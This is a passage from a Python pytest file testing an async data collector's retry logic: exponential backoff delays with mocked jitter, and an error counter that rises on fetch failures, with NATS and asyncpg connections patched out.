        effects = [RuntimeError("boom")] * num_failures + [asyncio.CancelledError]
        mock_nc, _ = self._build_start_mocks(collector, effects)

        sleep_delays = []
        jitter_value = 0.42

        async def capture_sleep(delay):
            sleep_delays.append(delay)

        with patch("nats.connect", AsyncMock(return_value=mock_nc)), \
             patch("asyncpg.create_pool", AsyncMock(return_value=collector.pool)), \
             patch("asyncio.sleep", side_effect=capture_sleep), \
             patch("random.uniform", return_value=jitter_value):
            with pytest.raises(asyncio.CancelledError):
                await collector.start()

        assert len(sleep_delays) == num_failures
        expected_bases = [1, 2, 4]
        for i, delay in enumerate(sleep_delays):
            assert delay == expected_bases[i] + jitter_value
            assert delay > expected_bases[i]  # jitter makes it strictly greater

    @pytest.mark.asyncio
    async def test_error_count_incremented_on_failure(self, collector):
        """Each fetch failure should increment collector.error_count."""
        num_failures = 3
        effects = [RuntimeError("boom")] * num_failures + [asyncio.CancelledError]
        mock_nc, _ = self._build_start_mocks(collector, effects)

        with patch("nats.connect", AsyncMock(return_value=mock_nc)), \
             patch("asyncpg.create_pool", AsyncMock(return_value=collector.pool)), \
             patch("asyncio.sleep", AsyncMock()), \
             patch("random.uniform", return_value=0.0):
            with pytest.raises(asyncio.CancelledError):
                await collector.start()

        assert collector.error_count == num_failures
